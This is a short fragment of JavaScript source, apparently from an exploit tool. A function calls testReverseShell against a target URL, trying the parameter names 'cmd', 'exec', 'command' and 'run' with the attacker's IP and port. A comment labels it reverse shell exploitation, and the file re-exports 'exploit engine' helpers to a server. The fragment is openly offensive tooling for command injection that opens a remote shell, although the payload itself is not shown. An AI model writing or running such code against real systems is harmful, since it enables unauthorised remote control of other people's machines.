    // Terminal command for reverse shell exploitation
    return testReverseShell(url, ['cmd', 'exec', 'command', 'run'], yourIp, yourPort, options);
}

// Re-export exploit engine utilities for server.js
export { generateRandomPort, validateIP, getLocalIP };
